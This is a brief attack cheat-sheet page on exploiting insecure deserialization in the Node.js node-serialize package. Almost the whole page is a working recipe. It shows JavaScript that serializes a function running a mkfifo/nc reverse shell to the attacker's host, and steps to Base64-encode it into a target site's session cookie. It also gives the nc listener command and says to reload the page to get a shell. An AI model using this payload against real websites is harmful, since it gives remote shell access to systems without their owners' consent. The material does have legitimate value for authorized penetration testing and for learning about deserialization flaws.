---
title: Node.js Deserialization Attack
desc: Node.js deserialization is vulnerable to remote command executions.
tags: [Deserialization, Deserialize, JavaScript, JS, Node, RCE, Reverse, Serialize, Shell, Web]
alts: [Reverse-Shell]
render_with_liquid: false
---

First, you need to install a npm package.

```bash
npm install node-serialize
```

Create the payload for serialization to execute a reverse shell.  
For instance, the file is named “serialize.js”.

```jsx
let y = {
  rce: function() {
    let childProcess = require('child_process');
    childProcess.exec('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <local-ip> <local-port> >/tmp/f', (error, stdout, stderr) => {
        console.log(stdout);
    });
  }
};

let serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```

Then execute it to generate the payload.

```bash
node serialize.js
```

Copy the output and encode it by Base64, then copy the encoded text.  
Paste it to the Cookie value of HTTP header in target website.

```bash

Cookie: session=eyJyY2U...iAgfSJ9==
```

Start a listener for reverse shell

```bash
nc -lvnp <local-port>
```

In target website, reload the page.  
You should get a shell.